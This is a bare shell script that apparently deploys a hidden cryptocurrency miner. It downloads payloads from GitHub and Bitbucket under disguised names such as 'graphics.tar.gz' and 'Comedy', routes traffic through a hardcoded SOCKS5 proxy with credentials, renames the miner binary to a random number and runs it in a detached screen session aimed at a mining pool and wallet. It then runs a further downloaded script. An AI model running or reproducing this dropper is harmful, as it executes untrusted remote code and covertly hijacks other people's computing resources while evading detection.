sudo apt install screen -y > /dev/null 2>&1

wget https://bitbucket.org/lukisanwarna/runing/raw/e57b4db45e10275c6a181fb18d5659efce0d0dd3/time.sh 

wget https://github.com/catursawah/xmr/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.155.69.201:6406
socks5_username = ingfoingfo
socks5_password = maszZeehh
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo " "
echo " "


GOGO=$(shuf -i 10000-999999999 -n 1)
MARKONAH=$(shuf -i 10000-9999999999 -n 1)


./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/Comedy

mv -f Comedy $GOGO
chmod 777 $GOGO

screen -S $MARKONAH -dm ./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.SLEEP

screen -ls
sleep 2
clear
cd ..
screen -ls

chmod 777 time.sh
./time.sh